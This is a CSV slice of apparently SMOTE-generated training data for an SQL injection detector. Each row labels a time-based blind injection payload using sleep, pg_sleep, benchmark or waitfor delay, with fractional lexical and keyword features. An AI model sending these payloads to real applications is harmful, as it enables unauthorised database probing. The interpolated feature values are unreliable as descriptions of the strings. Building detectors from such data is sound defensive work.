id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000282,attack,time,"1"" or elt  (  6272  =  6272,sleep  (  5   )    )   ",nearest_attack_euclidean,R000065,1.2075345223537755,54.682802010004366,18.28329246230803,3.0116298694504713,10.0,10.0,26.832924623080284,7.849877386924085,0.18479533697915326,0.1847953369791533,0.4877732559855973,0.14263607005609613,0.2832924623080285,0.7167075376919717,0.0,0.0,0.0,1.0,0.0,4.566584924616056,1.3877787807814457e-17,0.0,1.0,0.9999999999999999,0.2832924623080284,0.7167075376919716,0.0,0.2832924623080283,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000283,attack,time,"1 where 5466  =  5466 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000045,1.280162294819512,88.30863774369338,26.691362256306622,3.7614164258993843,21.617275487386756,27.14817353783973,31.54318871846689,8.0,0.24474449058637304,0.3075956047960659,0.3570660718736319,0.09059383274392913,1.1102230246251565e-16,0.0,0.0,0.0,0.0,1.691362256306622,0.0,4.617275487386756,1.3877787807814457e-17,0.0,1.0,1.691362256306622,0.0,0.0,0.0,0.691362256306622,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.30863774369337804,0.0,0.691362256306622,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000284,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,1.755568758082348,50.341748436616044,24.753342678470407,4.264223298185357,25.205049061969632,2.8766713392352035,9.821692365793616,12.4383356696176,0.48845254782982866,0.05714285714285714,0.1804287716815087,0.2739758233458055,2.8766713392352026,0.0,2.0,0.0,0.0,0.0,0.0,1.4383356696176008,1.3877787807814457e-17,2.6849929911471957,1.0,2.4383356696176013,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000285,attack,time,"1""   )    )    as klie where 2840  =  2840 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000052,1.3633813461591127,98.96664808562215,28.76228021277953,3.7361411922523784,25.14736255335436,25.573681276677185,37.72104383003154,10.52456042555906,0.25196415467789035,0.2618859893610235,0.3779462320168355,0.10820362394425063,1.1102230246251565e-16,1.0,0.0,0.0,0.0,1.76228021277953,0.0,5.524560425559059,0.23771978722047,0.0,1.0,1.76228021277953,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.76228021277953,0.0,0.23771978722047007,0.7622802127795301,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.76228021277953
SMOTE_000286,attack,time,1'   )    )    as kahn where 1361  =  1361 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000062,2.9413759002940107,123.62168741954164,29.10076700888257,3.469260622711106,43.46199422309468,10.0,54.89923299111743,15.26046020532954,0.34999051005854453,0.08104609733707716,0.44580300859916616,0.12316038400521218,1.8403068035530268,0.0,0.0,0.0,1.0,1.0,0.0,9.579846598223487,1.3877787807814457e-17,0.0,0.0,2.8403068035530272,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.4201534017765135,2.4201534017765134,0.0,1.0,1.4201534017765134,0.4201534017765135,0.5798465982234866,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.840306803553027
SMOTE_000287,attack,time,"1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000047,2.141829024818052,65.43917387745984,21.597155918357913,3.3239006688035504,15.129541224477219,15.259082448954437,27.453394285670267,7.597155918357915,0.23614374704224889,0.23091726830269965,0.41617373081881437,0.11676525383623713,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.5323853061193048,0.0,5.064770612238609,1.3877787807814457e-17,0.0,1.0,0.5323853061193049,0.0,0.0,0.0,1.0,0.0,0.5323853061193048,1.0,0.0,0.0,0.5323853061193047,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000288,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.31550311664805614,39.72471015515148,23.0,4.1070832338658585,16.0,2.0,8.937258462626232,12.787451692525247,0.40446316203315424,0.05055789525414429,0.22242543234575657,0.32255351036694485,2.0,0.0,2.0,0.0,0.0,0.0,0.0,1.787451692525246,1.3877787807814457e-17,4.0,1.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000289,attack,time,"1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000063,2.3529854459867052,63.68313388125826,21.218062831192192,3.1864048976670443,13.802393424900899,10.0,29.88074045635736,10.0,0.21739132945959194,0.15703587827068885,0.4685369139990303,0.15703587827068885,1.633732237483483,0.0,0.0,0.0,0.0,1.0,0.0,5.049401643774775,1.3877787807814457e-17,0.0,0.6831338812582584,1.6337322374834828,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.3168661187417415,0.31686611874174153,0.0,0.3168661187417416,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.6337322374834833
SMOTE_000290,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.3893590700259664,36.7009124299891,16.0,3.0230251787163045,11.0,0.0,16.700912429989103,9.0,0.299912530421399,1.3877787807814457e-17,0.45470449014291103,0.24538297943569004,0.9003041433297011,0.19939171334059783,0.0,0.0,0.0,1.0,0.0,2.900304143329701,1.3877787807814457e-17,4.0,0.0,0.9999999999999999,0.900304143329701,0.0996958566702989,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000291,attack,time,1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000053,1.6651463278179661,104.83889121249761,29.83889121249761,3.609590005641594,30.419445606248807,18.0,45.0,11.419445606248805,0.29013566823974485,0.17170718053111783,0.4292679513277946,0.10888919990134271,1.1102230246251565e-16,0.41944560624880534,2.0,0.0,0.0,2.0,0.0,6.0,1.3877787807814457e-17,1.0,0.0,4.0,0.0,0.41944560624880534,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.4194456062488053,0.5805543937511946,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000292,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,0.3437630193850807,28.72742925803876,15.86371462901938,3.362238781085631,11.0,0.0,9.863714629019377,7.8637146290193805,0.3831395634247428,1.3877787807814457e-17,0.34326108768987795,0.27359934888537923,1.1102230246251565e-16,0.8637146290193807,0.0,0.0,0.0,0.0,0.0,2.0,1.3877787807814457e-17,4.0,0.0,0.0,0.0,0.8637146290193805,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000293,attack,time," or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000039,0.11372120914201113,49.47661479107216,20.0,3.2961674233849876,13.0,10.476614791072157,20.0,6.0,0.2627771460065559,0.2116685619803323,0.4042725323177783,0.12128175969533349,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,4.0,1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000294,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,0.7520142194357969,29.596623533614917,14.957974120168949,3.379677652188158,11.638649413445966,0.3193247067229832,8.638649413445965,9.0,0.3932027323665833,0.009676506264332821,0.29124371786533304,0.30587704350375083,1.1102230246251565e-16,0.0,2.0,0.0,0.0,0.0,0.0,2.0,1.3877787807814457e-17,5.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.3193247067229829,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.31932470672298274
SMOTE_000295,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866",nearest_attack_euclidean,R000042,0.5040283553471809,88.79154900242527,26.208450997574726,3.5687036207119642,22.270421508488454,22.79154900242527,35.31267649636209,8.416901995149454,0.25066019465319533,0.25665016584787137,0.3977946523429345,0.09489498715599887,0.10422549878736365,0.0,0.0,0.0,0.0,1.0,0.0,6.104225498787364,0.10422549878736358,0.0,1.0,0.9999999999999999,0.10422549878736359,0.0,0.0,0.10422549878736348,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.8957745012126364,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.8957745012126366
SMOTE_000296,attack,time,"1""   )    )    as dnhd where 2657  =  2657 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000044,1.911299007119986,92.99197668187105,26.687441843274776,3.4402546735223303,25.445232534502814,14.687441843274774,41.68744184327477,11.171860460818694,0.27092607965747667,0.15492804677571081,0.4526995542430644,0.12144631932374814,1.1102230246251565e-16,0.5859302304093468,2.0,0.0,0.0,1.585930230409347,0.0,6.0,1.3877787807814457e-17,1.0,0.0,3.585930230409347,0.0,0.5859302304093468,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.5859302304093468,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.585930230409347
SMOTE_000297,attack,time,"1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000063,1.069318131365111,64.5023525145029,19.251176257251455,2.8839632758532248,10.251176257251455,10.0,34.0,10.251176257251455,0.1588664193463693,0.15506071847892305,0.5272064428283383,0.1588664193463693,1.0,0.0,0.0,0.0,0.0,1.0,0.0,6.0,0.2511762572514543,0.0,1.0,0.9999999999999999,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.2511762572514545,0.7488237427485456,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000298,attack,time,1 waitfor delay '0:0:10'--,nearest_attack_euclidean,R000021,0.5210373153038776,26.485581885254533,17.0,3.926876162594691,12.485581885254533,4.514418114745467,3.0,6.4855818852545335,0.47122243076006187,0.17086461760272004,0.11330947912284389,0.24460347251437417,2.485581885254533,0.0,2.0,0.0,0.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000299,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,1.2748224158447623,31.09750945086862,15.858505670521174,3.4345582780385824,12.23900378034745,0.0,9.23900378034745,9.619501890173725,0.39352759944823995,1.3877787807814457e-17,0.2964415911718394,0.31003080937992067,1.1102230246251565e-16,0.6195018901737248,2.0,0.0,0.0,0.0,0.0,2.0,1.3877787807814457e-17,5.0,0.0,2.0,0.0,0.6195018901737248,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6195018901737248,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6195018901737246
SMOTE_000300,attack,time,1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000053,2.676440844460273,91.23689037169683,26.57106711150905,3.4112933556734553,25.09475614867873,14.06317076578582,41.06317076578582,11.015792691446455,0.2715616373184389,0.1509970300996467,0.4551931522401862,0.1222481803417282,1.1102230246251565e-16,0.5078963457232277,2.0,0.0,0.0,1.5078963457232277,0.0,6.0,1.3877787807814457e-17,1.0,0.0,3.5078963457232275,0.0,0.5078963457232275,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.5078963457232277,1.0,0.5078963457232276,0.4921036542767724,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.5078963457232275
SMOTE_000301,attack,time,"1%"" and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000064,0.8654470189080958,73.29411601908298,27.653250945359687,3.815982257793396,17.213621691241098,21.346749054640313,25.907119800521723,8.826625472679844,0.23374761831164514,0.2927922949316339,0.35159544166589557,0.12186464509082538,1.1102230246251565e-16,0.8266254726798432,0.0,0.0,0.0,1.0,0.0,4.346749054640314,0.8266254726798431,0.0,1.0,0.9999999999999999,0.0,0.8266254726798432,0.0,0.8266254726798431,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.1733745273201568,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.173374527320157
SMOTE_000302,attack,time,"1 where 5466  =  5466 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000045,0.06194380202889469,88.01493419652448,26.98506580347552,3.8390924120977146,21.029868393048957,28.910394820853135,30.07467098262239,8.0,0.23893192038576277,0.32848335706535564,0.3416908861816951,0.09089383636718644,1.1102230246251565e-16,0.0,0.0,0.0,0.0,1.9850658034755222,0.0,4.029868393048956,1.3877787807814457e-17,0.0,1.0,1.9850658034755222,0.0,0.0,0.0,0.985065803475522,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.014934196524477805,0.0,0.9850658034755222,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000303,attack,time,"""  )   or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000035,0.3041695549713284,54.43452009168322,20.886904018336644,3.2367574321217423,13.0,10.113095981663356,23.547616073346575,7.7738080366732865,0.23903681411204297,0.18613639202714635,0.43225105521224155,0.1425757386485691,1.1102230246251565e-16,0.8869040183366435,0.0,0.0,0.0,0.0,0.0,4.886904018336644,1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.8869040183366432,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000304,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,1.1245545382102375,35.84422077504709,16.0,3.0948948839050714,11.0,0.5703517312539246,15.703517312539246,8.570351731253925,0.31599122916272665,0.013911017835461587,0.4263749321389127,0.24372282086289912,1.1102230246251565e-16,0.4296482687460755,0.0,0.0,0.0,0.0,0.0,3.140703462507849,1.3877787807814457e-17,4.0,0.0,0.0,0.0,0.4296482687460754,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000305,attack,time,"1""   )    )    as dnhd where 2657  =  2657 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000044,1.1298145706327394,99.66455403387926,29.38437161929376,3.5896262935061847,27.94790539764587,16.358324318116694,43.3583243181167,12.0,0.27903477344622524,0.16222568785924368,0.436735276899058,0.12200426179547305,1.1102230246251565e-16,1.0,2.0,0.0,0.0,1.7947905397645867,0.0,6.0,0.2052094602354133,1.0,0.0,3.7947905397645867,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.7947905397645868,1.0,0.20520946023541328,0.7947905397645867,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.7947905397645867
SMOTE_000306,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,2.453603036747269,33.749645002478005,17.980523463254002,3.6477985178967423,13.211401924030001,0.8845607696120013,8.884560769612001,10.769121539224,0.39170135787942684,0.021574652917365877,0.2672217260708293,0.31950226313237806,0.8845607696120008,0.0,2.0,0.0,0.0,0.0,0.0,2.0,1.3877787807814457e-17,4.557719615194,0.44228038480600046,2.0,0.44228038480600046,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.44228038480600035,0.44228038480600035,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8845607696120008
SMOTE_000307,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,0.3483206843670849,35.51394893008849,23.0571054366765,4.268667206494781,16.0,2.0,5.399738056735497,12.114210873352999,0.45180312799908057,0.05647539099988507,0.15027343333461027,0.34144804766642406,2.0,0.057105436676499366,2.0,0.0,0.0,0.0,0.057105436676499435,1.057105436676499,1.3877787807814457e-17,4.0,0.9428945633235005,2.0,1.0,0.057105436676499505,1.0,0.0,0.0,0.0,1.0,0.057105436676499435,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000308,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,2.986561873224711,30.578298872864643,20.052199248576425,4.119577577971517,14.034799499050951,3.4739003757117874,4.017399749525477,9.052199248576425,0.45930241813291106,0.1235493575870146,0.12935988666930598,0.2877883376107684,2.0,0.0,2.0,0.0,0.0,0.0,0.0,0.5086998747627374,1.3877787807814457e-17,2.0347994990509504,0.5086998747627375,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.5086998747627374,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000309,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,0.6348900764707878,45.98247575961961,16.426067965659943,2.810915611764638,10.857977344780018,1.420226552199816,23.70427186263978,10.0,0.24167361644975474,0.0221910398781221,0.5144146887288805,0.2217206549432427,1.0,0.0,0.0,0.0,0.0,1.0,0.0,4.2840453104399625,1.3877787807814457e-17,3.431909379120075,0.14202265521998164,0.9999999999999999,1.0,0.0,0.0,0.14202265521998145,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000310,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.3240278684973082,42.79040734349887,16.754489704833208,3.1267757078090552,13.0,0.7544897048332082,18.28142793383245,10.754489704833208,0.3066201879842683,0.016766437885182395,0.42398525318054503,0.2526281209500042,1.1102230246251565e-16,0.0,2.0,0.0,0.0,0.0,0.0,3.7544897048332073,1.3877787807814457e-17,5.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000311,attack,time,"1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000070,0.26398279879012837,73.46287328546161,24.884281678634597,3.5235899250964775,16.0,18.0,30.46287328546162,9.0,0.21786052791898491,0.24509309390885797,0.41449983121772804,0.122546546954429,0.8842816786345957,0.0,0.0,0.0,0.0,2.0,0.0,4.115718321365404,1.3877787807814457e-17,0.0,1.0,2.0,0.8842816786345956,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000312,attack,time,""" or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000040,0.5313280183351329,33.723036543496434,16.0,3.1691981245110323,11.0,0.0,13.861518271748215,8.861518271748213,0.32632959376979714,1.3877787807814457e-17,0.4110010198809644,0.2626693863492384,0.13848172825178562,1.7230365434964288,0.0,0.0,0.0,1.0,0.0,2.0,1.3877787807814457e-17,4.0,0.0,0.9999999999999999,0.13848172825178567,0.8615182717482144,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
